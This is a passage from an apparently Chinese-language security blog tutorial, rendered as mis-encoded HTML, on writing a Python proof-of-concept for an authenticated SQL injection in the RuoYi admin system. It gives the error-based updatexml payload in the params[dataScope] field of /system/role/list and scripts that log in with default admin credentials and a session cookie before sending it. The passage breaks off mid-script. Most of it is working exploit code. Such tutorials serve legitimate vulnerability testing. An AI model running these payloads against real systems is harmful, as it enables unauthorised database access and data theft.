data-src="/../images/poc/image-20230511213027417.png" data-caption="image-20230511213027417"><img src="/../images/poc/image-20230511213027417.png" alt="image-20230511213027417"></a></p><p>æ·»åŠ æ¼æ´å‚æ•° <code>params[dataScope]</code>ï¼Œç»æµ‹è¯•å­˜åœ¨æ¼æ´ï¼Œè¿™é‡Œ Poc ç¼–å†™ä¸ä¸Šé¢åŸºç¡€å­¦ä¹ ä¸­çš„ POST æ³¨å…¥å®ä¾‹å·®å¼‚ä¸å¤§ï¼Œä¸»è¦è§£å†³çš„é—®é¢˜æ˜¯è§£å†³ç™»å½•é—®é¢˜ï¼Œå…·ä½“å®Œæ•´ POST è¯·æ±‚ä½“å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pageSize=<span class="number">10</span>&amp;pageNum=<span class="number">1</span>&amp;orderByColumn=roleSort&amp;isAsc=asc&amp;roleName=&amp;roleKey=&amp;status=&amp;params%5BbeginTime%<span class="number">5D</span>=&amp;params%5BendTime%<span class="number">5D</span>=&amp;params[dataScope]=and+updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT+version()),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">2523</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230511213252661.png" data-caption="image-20230511213252661"><img src="/../images/poc/image-20230511213252661.png" alt="image-20230511213252661"></a></p><p>2ã€<strong>ç™»å½•åˆ†æ</strong>ï¼Œç™»å½•éœ€è¦æ£€æŸ¥éªŒè¯ç ï¼Œè‹¥éªŒè¯ç è¾“å…¥é”™è¯¯ï¼Œç³»ç»Ÿè¿”å›ä¿¡æ¯ <code>&#123;&quot;msg&quot;:&quot;éªŒè¯ç é”™è¯¯&quot;,&quot;code&quot;:500&#125;</code></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230511214039469.png" data-caption="image-20230511214039469"><img src="/../images/poc/image-20230511214039469.png" alt="image-20230511214039469"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230511214311347.png" data-caption="image-20230511214311347"><img src="/../images/poc/image-20230511214311347.png" alt="image-20230511214311347"></a></p><p>ç”±ä¸Šå›¾å¯çŸ¥ï¼Œç³»ç»Ÿè¯·æ±‚ç™»å½• post æ•°æ®åŒ…è¯·æ±‚ä½“ä¸º <code>username=admin&amp;password=admin123&amp;validateCode=1&amp;rememberMe=false</code>ï¼Œç™»å½•æ—¶ç³»ç»Ÿè¿˜å¸¦æœ‰ä¸€ä¸ª Cookie éªŒè¯ï¼Œæ‰€ä»¥ Cookie çš„è·å–ä¹Ÿæ˜¯éœ€è¦æˆ‘ä»¬è§£å†³çš„é—®é¢˜ã€‚</p><h4 id="åˆ†æå°ç»“"><a href="#åˆ†æå°ç»“" class="headerlink" title="åˆ†æå°ç»“"></a>åˆ†æå°ç»“</h4><p>æ¼æ´å¤„äºåå°çš„ POST è¯·æ±‚ï¼Œåœ¨ç¼–å†™ Poc æ—¶éœ€è¦å…ˆè§£å†³ç™»å½•ï¼Œåå†è¿›è¡Œ POST æ•°æ®è¯·æ±‚éªŒè¯æ¼æ´</p><blockquote><p>1ã€ç™»å½•éœ€è¦éªŒè¯ç éªŒè¯</p><p>2ã€ç™»å½•è¯·æ±‚éœ€è¦æºå¸¦ Cookie å€¼ï¼Œä¸”å½“ç”¨æˆ·åœ¨å‰å°ç™»å½•åé€€å‡ºä¼š Cookie ä¼šè¿›è¡Œæ›´æ–°</p></blockquote><h4 id="Poc-åˆæ­¥ç¼–å†™"><a href="#Poc-åˆæ­¥ç¼–å†™" class="headerlink" title="Poc åˆæ­¥ç¼–å†™"></a>Poc åˆæ­¥ç¼–å†™</h4><p>1ã€åˆ©ç”¨ Python è§£å†³ç™»å½•é—®é¢˜ï¼Œè¿™é‡Œåªéœ€ä½¿ç”¨ requests åº“å³å¯ï¼Œæˆ‘ä»¬å…ˆåˆ©ç”¨ Burp æŠ“åŒ…è·å–å…¶ POST æ•°æ®æ ¼å¼</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513100250547.png" data-caption="image-20230513100250547"><img src="/../images/poc/image-20230513100250547.png" alt="image-20230513100250547"></a></p><p>ç™»å½•æˆåŠŸæ•°æ®åŒ…åŠè¿”å›åŒ…å¦‚ä¸‹å›¾ï¼Œ<code>username</code>ã€<code>pasword</code> å‚æ•°ä¸ºè´¦æˆ·å¯†ç å‚æ•°ï¼Œ<code>validateCode</code> å‚æ•°ä¸ºéªŒè¯ç å‚æ•°ï¼Œ<code>remnberMe</code> ä¸ºè®°ä½å¯†ç å‚æ•°</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=admin123&amp;validateCode=<span class="number">2</span>&amp;rememberMe=<span class="literal"><span class="keyword">false</span></span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513100446127.png" data-caption="image-20230513100446127"><img src="/../images/poc/image-20230513100446127.png" alt="image-20230513100446127"></a></p><p>2ã€Python æ„é€ ç™»å½•è¯·æ±‚åŒ…</p><p>é€šè¿‡åˆæ­¥åˆ†æè¯·æ±‚ï¼Œå‘ç°æ— è®ºè´¦å·å¯†ç ã€éªŒè¯ç æ˜¯å¦æ­£ç¡®å‡è¿”å›å“åº”ä¸º <code>&#123;&quot;msg&quot;:&quot;éªŒè¯ç é”™è¯¯&quot;,&quot;code&quot;:500&#125;</code></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513101559864.png" data-caption="image-20230513101559864"><img src="/../images/poc/image-20230513101559864.png" alt="image-20230513101559864"></a></p><p>åˆæ­¥ç¼–å†™çš„ä»£ç å¦‚ä¸‹ï¼Œå…ˆéªŒè¯æ˜¯å¦èƒ½æ­£å¸¸ç™»å½•</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ï¼šdemo.py</span></span><br><span class="line"><span class="string">@IDE     ï¼šPyCharm</span></span><br><span class="line"><span class="string">@Author  ï¼šFunsiooo</span></span><br><span class="line"><span class="string">@Blog    ï¼šhttps://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®è¯·æ±‚ç™»å½•çš„ URL</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.103:8888/login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½® Headers å¯ä»¥æ¨¡æ‹Ÿæµè§ˆå™¨å‘é€HTTPè¯·æ±‚ï¼Œé¿å…è¢«æ‹¦æˆª</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€  POST æ•°æ®åŒ…ï¼Œå‚æ•°ä¸ç”¨æˆ·è¾“å…¥æ•°æ®åˆ†åˆ«ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·æ‹¬èµ·æ¥ä¸”ä¸­é—´ä½¿ç”¨:åˆ†éš”å¼€</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin123&#x27;</span>,<span class="string">&#x27;validateCode&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;rememberMe&#x27;</span>:<span class="string">&#x27;false&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ©ç”¨ request è¯·æ±‚ post è¿›è¡Œç™»é™†</span></span><br><span class="line">res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿”å›è¯·æ±‚å“åº”æ–‡æœ¬</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div><p>é€šè¿‡æŠ“åŒ…åˆ†æå‘ç°ï¼Œåœ¨è¿›è¡Œ POST è¯·æ±‚æ—¶ï¼Œç™»å½•è¯·æ±‚éœ€è¦å¸¦æœ‰ Cookie å€¼ï¼Œç”¨æˆ·åœ¨å‰å°ç™»å½•åé€€å‡ºé‡æ–°è¯·æ±‚ç™»å½•å  Cookie å€¼åä¼šå‘ç”Ÿå˜åŒ–</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513102003591.png" data-caption="image-20230513102003591"><img src="/../images/poc/image-20230513102003591.png" alt="image-20230513102003591"></a></p><p>3ã€è§£å†³ Cookie å€¼é—®é¢˜ï¼Œè¿™é‡Œå…ˆç®€å•å°† Cookie å€¼æ‰‹åŠ¨æ·»åŠ åˆ° Python ä»£ç ä¸­ï¼Œåœ¨ä»£ç ä¸­æºå¸¦ Cookie è¿›è¡Œç™»å½•è¯·æ±‚</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ï¼šdemo.py</span></span><br><span class="line"><span class="string">@IDE     ï¼šPyCharm</span></span><br><span class="line"><span class="string">@Author  ï¼šFunsiooo</span></span><br><span class="line"><span class="string">@Blog    ï¼šhttps://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®è¯·æ±‚ç™»å½•çš„ URL</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.103:8888/login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½® Headers å¯ä»¥æ¨¡æ‹Ÿæµè§ˆå™¨å‘é€ HTTP è¯·æ±‚ï¼Œé¿å…è¢«æ‹¦æˆªï¼Œå¹¶æºå¸¦ Cookie å€¼è¿›è¡Œè¯·æ±‚</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;JSESSIONID=8a3a309c-9bf1-4936-8c92-1fecd58ab1ed&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€  POST æ•°æ®åŒ…ï¼Œå‚æ•°ä¸ç”¨æˆ·è¾“å…¥æ•°æ®åˆ†åˆ«ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·æ‹¬èµ·æ¥ä¸”ä¸­é—´ä½¿ç”¨:åˆ†éš”å¼€</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin123&#x27;</span>,<span class="string">&#x27;validateCode&#x27;</span>:<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;rememberMe&#x27;</span>:<span class="string">&#x27;false&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ©ç”¨ request è¯·æ±‚ post è¿›è¡Œç™»é™†</span></span><br><span class="line">res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿”å›è¯·æ±‚å“åº”æ–‡æœ¬</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513102452982.png" data-caption="image-20230513102452982"><img src="/../images/poc/image-20230513102452982.png" alt="image-20230513102452982"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513102657847.png" data-caption="image-20230513102657847"><img src="/../images/poc/image-20230513102657847.png" alt="image-20230513102657847"></a></p><p>4ã€ç™»å½•åç»§ç»­è¯·æ±‚ POST æ•°æ®åŒ…è¿›è¡Œæ¼æ´éªŒè¯ï¼ŒæˆåŠŸè¿”å›å“åº”ï¼Œè„šæœ¬å¯ç”¨</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ï¼šdemo.py</span></span><br><span class="line"><span class="string">@IDE     ï¼šPyCharm</span></span><br><span class="line"><span class="string">@Author  ï¼šFunsiooo</span></span><br><span class="line"><span class="string">@Blog    ï¼šhttps://funsiooo.github.io </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®è¯·æ±‚ç™»å½•çš„ URL</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.103:8888/login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½® Headers å¯ä»¥æ¨¡æ‹Ÿæµè§ˆå™¨å‘é€ HTTP è¯·æ±‚ï¼Œé¿å…è¢«æ‹¦æˆªï¼Œå¹¶æºå¸¦ Cookie å€¼è¿›è¡Œè¯·æ±‚</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;JSESSIONID=81be198a-87df-4a09-914c-19b71ef32709&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€  POST æ•°æ®åŒ…ï¼Œå‚æ•°ä¸ç”¨æˆ·è¾“å…¥æ•°æ®åˆ†åˆ«ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·æ‹¬èµ·æ¥ä¸”ä¸­é—´ä½¿ç”¨:åˆ†éš”å¼€</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin123&#x27;</span>,<span class="string">&#x27;validateCode&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;rememberMe&#x27;</span>:<span class="string">&#x27;false&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ©ç”¨ request è¯·æ±‚ post è¿›è¡Œç™»é™†</span></span><br><span class="line">res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸Šä¸€æ­¥ç™»å½•çš„å“åº”ä¸­è‹¥å­˜åœ¨ &quot;æ“ä½œæˆåŠŸ&quot; æ–‡æœ¬åˆ™è¿›è¡Œä¸‹ä¸€æ­¥çš„ POST è¯·æ±‚</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;æ“ä½œæˆåŠŸ&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="comment"># ç»§ä¸Šä¸€æ­¥çš„ç™»é™†åï¼Œæ„é€ ç™»é™†åçš„æ•°æ®è¯·æ±‚ URLï¼Œä¸‹é¢ä¸ºæ¼æ´é“¾æ¥</span></span><br><span class="line">    post_url = <span class="string">&#x27;http://192.168.1.103:8888/system/role/list&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ„é€ ç™»é™†åçš„æ•°æ®è¯·æ±‚ POST åŒ…ï¼Œè¿™é‡Œæ˜¯æ¼æ´é“¾æ¥çš„ POST æ•°æ®åŒ…</span></span><br><span class="line">    post_data = &#123;<span class="string">&#x27;pageSize&#x27;</span>: <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;pageNum&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;orderByColumn&#x27;</span>: <span class="string">&#x27;roleSort&#x27;</span>, <span class="string">&#x27;isAsc&#x27;</span>: <span class="string">&#x27;asc&#x27;</span>, <span class="string">&#x27;roleName&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;roleKey&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;params%5BbeginTime%5D&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;params%5BendTime%5D&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;params[dataScope]&#x27;</span>: <span class="string">&#x27;and+updatexml(1,concat(0x7e,(SELECT+version()),0x7e),1)%2523&#x27;</span>&#125;</span><br><span class="line">   </span><br><span class="line"><span class="comment"># ç™»é™†åç»§ç»­ä¿æŒ headers å¤´ï¼Œè¿™ä¸€æ­¥å¾ˆé‡è¦ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸€æ­¥å°±æ— æ³•ä¿æŒå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨çš„è¿æ¥ï¼Œç»§è€Œæ— æ³•è¿›è¡Œåå°è¯·æ±‚</span></span><br><span class="line">    post_headers = headers</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¼€å§‹åå°æ¼æ´éªŒè¯çš„ POST è¯·æ±‚</span></span><br><span class="line">    post_requests = requests.post(url=post_url,data=post_data,headers=post_headers)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è‹¥ post_requests æ•°æ®è¯·æ±‚å“åº”å­˜åœ¨ &quot;java.sql.SQLException: XPATH syntax error&quot; åˆ™è¯æ˜å­˜åœ¨æ¼æ´ï¼Œè¿”å› &quot;[+] Vulnerable to SQL injection&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;java.sql.SQLException: XPATH syntax error:&quot;</span> <span class="keyword">in</span> post_requests.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Vulnerable to SQL injection&quot;</span>)</span><br><span class="line">    <span class="comment"># è‹¥ä¸å­˜åœ¨ &quot;java.sql.SQLException: XPATH syntax error&quot; åˆ™è¯æ˜å­˜åœ¨ä¸æ¼æ´ï¼Œè¿”å› &quot;[-] Not vulnerable to SQL injection &quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Not vulnerable to SQL injection &quot;</span>)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513112813776.png" data-caption="image-20230513112813776"><img src="/../images/poc/image-20230513112813776.png" alt="image-20230513112813776"></a></p><p>å°†æ¼æ´å‚æ•°å»æ‰ï¼Œé‡æ–°å†éªŒè¯ Poc æ˜¯å¦è¿˜å­˜åœ¨æ¼æ´è‹¥è¿˜æ˜¯è¿”å› <code>[+] Vulnerable to SQL injection</code> åˆ™ä»£ç å­˜åœ¨é—®é¢˜ï¼Œå»æ‰æ¼æ´å‚æ•°åï¼Œå“åº”è¿”å› <code>[-] Not vulnerable to SQL injection</code>ï¼Œ Poc æ­£å¸¸è¿è¡Œ</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230513112611949.png" data-caption="image-20230513112611949"><img src="/../images/poc/image-20230513112611949.png" alt="image-20230513112611949"></a></p><p>åˆ°æ­¤ä¸ºæ­¢ï¼Œä¸€ä¸ªç®€æ˜“çš„è‹¥ä¾åå°æ³¨å…¥ Poc å°±ç¼–å†™å®Œæˆäº†ã€‚</p><h4 id="å®Œå–„ä»£ç "><a href="#å®Œå–„ä»£ç " class="headerlink" title="å®Œå–„ä»£ç "></a>å®Œå–„ä»£ç </h4><p>ç”±ä¸Šé¢çš„ä»£ç å¯çŸ¥ï¼Œè¯·æ±‚ä¸­çš„ <code>URL</code> ã€<code>Cooikeå€¼</code>ã€<code>éªŒè¯ç </code>ä¸€æ—¦è¯·æ±‚å‘ç”Ÿæ”¹å˜å‡éœ€è¦æ‰‹åŠ¨ä¿®æ”¹ä»£ç ï¼Œä½“éªŒä¸å¥½ï¼Œè¿™è¾¹ä½¿ç”¨ <code>argparse</code> åº“ï¼Œç›´æ¥åˆ©ç”¨å‘½ä»¤è¡Œå‚æ•°çš„æ¨¡å¼è¾“å…¥è¿™äº›å€¼ï¼Œè€Œä¸”ä»£ç æ ¼å¼ç›¸å¯¹æ··ä¹±æ²¡æœ‰è¿›è¡Œæ¨¡å—åŒ–å¤„ç†ï¼Œè¿™è¾¹ä½¿ç”¨å‡½æ•°çš„æ–¹å¼ï¼Œå°†ä»£ç æ¨¡å—åŒ–ï¼Œæé«˜ä»£ç é˜…è¯»æ€§</p><p>ç¾åŒ–åçš„ä»£ç å¦‚ä¸‹ï¼Œä¸»è¦ä¿®æ”¹ä¸ºå°†åˆæ­¥ç¼–å†™çš„ä»£ç è®¾ç½®ä¸€ä¸ª <code>Poc()</code> å‡½æ•°æ¨¡å—åŒ–ä»£ç ï¼Œæé«˜ä»£ç é˜…è¯»æ€§ï¼›æ·»åŠ äº† <code>banner()</code> å‡½æ•°ç”¨äºè„šæœ¬æˆåŠŸæ‰§è¡Œæ—¶è¾“å‡º <code>banner</code>ï¼Œç¾åŒ–è„šæœ¬ï¼›ä½¿ç”¨ <code>argparse</code> åº“å°†ä¹‹å‰çš„è„šæœ¬<code>éœ€è¦è¾“å…¥çš„å‚æ•°å€¼</code>ä¿®æ”¹ä¸º<code>é€šè¿‡å‘½ä»¤è¡Œå‚æ•°ä¼ å…¥</code>ç›¸åº”çš„å€¼ï¼Œæ–¹ä¾¿è„šæœ¬çš„è¿è¡Œï¼Œé¿å…éœ€è¦æ‰“å¼€è„šæœ¬æ‰‹åŠ¨ä¼ å…¥å‚æ•°å€¼ã€‚</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ï¼šdemo.py</span></span><br><span class="line"><span class="string">@IDE     ï¼šPyCharm</span></span><br><span class="line"><span class="string">@Author  ï¼šFunsiooo</span></span><br><span class="line"><span class="string">@Blog    ï¼šhttps://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªè§£æå¯¹è±¡parserï¼Œç”¨äºè£…è½½å‚æ•°çš„å®¹å™¨</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;python3 demo.py -u [login_url] -c [cookie] -v [Verification_Code] -b [Vul Links]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹è¿™ä¸ªè§£æå¯¹è±¡æ·»åŠ å‡ ä¸ªå‘½ä»¤è¡Œå‚æ•°ï¼Œtypeä¸ºè¾“å…¥ç±»å‹ï¼Œmetavarç”¨æ¥æ§åˆ¶éƒ¨åˆ†å‘½ä»¤è¡Œå‚æ•°çš„æ˜¾ç¤ºï¼Œrequire=Trueä¸ºå½“ç”¨æˆ·è¾“å…¥é”™è¯¯æ—¶ï¼Œç³»ç»Ÿè¿”å›æç¤ºæ­£ç¡®çš„è¾“å…¥æ–¹å¼ï¼Œhelpä¸ºæè¿°</span></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Please input the vulnerable url&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--cookie&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Please input the vul target cookie&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-v&#x27;</span>, <span class="string">&#x27;--validateCode&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Please inpute the verification code&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-b&#x27;</span>, <span class="string">&#x27;--bgurl&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Please inpute the Login background vulnerable url&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®ä¾‹åŒ– parser</span></span><br><span class="line">args 